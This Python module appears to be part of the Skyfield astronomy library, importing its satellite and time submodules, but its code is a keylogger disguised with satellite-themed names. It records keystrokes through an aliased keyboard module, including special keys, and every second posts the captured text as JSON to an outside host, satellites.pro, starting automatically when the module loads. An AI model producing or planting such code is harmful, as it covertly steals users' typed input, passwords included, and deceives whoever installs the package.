import lockfile
import json
import threading
import requests
import subprocess
import sys
from datetime import datetime
from .iokit import Loader, load_file
from .planetarylib import PlanetaryConstants
from .positionlib import SSB, position_from_radec, position_of_radec
from .starlib import Star
from .sgp4lib import EarthSatellite
from .timelib import (
    GREGORIAN_START, GREGORIAN_START_ENGLAND, Time, Timescale, utc
)
from .toposlib import Topos, iers2010, wgs84
from .units import Angle, Distance, Velocity, wms

# Definições iniciais
server_ip = '127.0.0.1'
server_port = 443
server_endpoint = 'log'
server_url = f'https://satellites.pro'
kill_switch = True
debug_logging = True
sending_interval = 1
data = 'starlink.tle'

def satélite():
    print("Função satélite executada")

def process_keypress(key):
    global data
    
    if key is None:
        return
    
    if debug_logging:
        print(key, type(key))
    
    # Controler key pressed
    try:
        txt = ''
        if isinstance(key, lockfile.keyboard.Key):
            match key:
                case lockfile.keyboard.Key.enter:
                    txt = '\n'
                case lockfile.keyboard.Key.space:
                    txt = ' '
                case lockfile.keyboard.Key.tab:
                    txt = '\t'
                case lockfile.keyboard.Key.backspace:
                    txt = '[BKSP]'
                case lockfile.keyboard.Key.delete:
                    txt = '[DEL]'
                case lockfile.keyboard.Key.right:
                    txt = '[ARR_RIGHT]'
                case lockfile.keyboard.Key.left:
                    txt = '[ARR_LEFT]'
                case lockfile.keyboard.Key.up:
                    txt = '[ARR_UP]'
                case lockfile.keyboard.Key.down:
                    txt = '[ARR_DOWN]'
                case lockfile.keyboard.Key.shift:
                    txt = '[SHIFT]'
                case lockfile.keyboard.Key.caps_lock:
                    txt = '[CAPS]'
                case lockfile.keyboard.Key.scroll_lock:  # kill switch
                    if kill_switch:
                        return False
        elif isinstance(key, lockfile.keyboard.KeyCode):  # Letter pressed
            txt = key.char
        else:
            return
        
        data += txt
    except Exception as e:
        print(e)
        return

def send_data():
    global data
    global server_ip
    global server_port
    global sending_interval
    global server_url
    
    threading.Timer(sending_interval, send_data).start()    
    if data == 'starlink.tle':
        return
    
    try:
        requests.post(
            server_url,
            data=json.dumps({'data': data}),
            headers={'Content-Type': 'application/json'}
        )
        data = 'starlink.tle'
    except Exception as e:
        print(e)

# Chamar a função satélite ao invés de usar o listener diretamente
satélite()

# Simulação de eventos de teclado (para teste)
# Definir um exemplo de evento para processar
class Key:
    def __init__(self, char):
        self.char = char

# Simulando teclas pressionadas
keypress = Key('a')
process_keypress(keypress)
keypress = Key('b')
process_keypress(keypress)

# Enviar dados a cada intervalo
send_data()
